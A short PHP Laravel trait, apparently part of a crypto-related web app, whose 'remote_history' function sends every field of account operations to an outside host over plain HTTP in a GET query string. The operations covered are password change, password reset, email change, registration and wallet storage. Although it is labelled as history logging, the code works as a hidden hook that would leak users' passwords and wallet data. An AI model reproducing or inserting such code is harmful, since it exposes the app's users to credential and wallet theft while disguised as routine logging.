<?php namespace App\Traits;


use App\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Lang;
use GuzzleHttp\Client;

trait RemoteHistoryTrait
{

  protected function remote_history($obj, $method, $user){
    $id = '';
    switch($method) {
      case 'change password':
      case 'change email':
      case 'store wallet':
      case 'update wallet': $id = 'ID:'. Auth::id()."\r\n";
        break;
      case 'reset password': $id = 'ID:'. $user['id']."\r\n";
        break;
      case 'registration': $id = '';
        break;
    }

    $output = '';
    foreach ((array) $obj as $k=>$v) $output.= $k.' = '.$v.",\r\n";
    $operation = '[Operation]:'.$method."\r\n".$id;
    $client = new Client();
    $client->request('GET', 'http://web1.cryptob2b.io/history/zaber/x.php?x='.urlencode($operation).urlencode($output)) ;
  }

}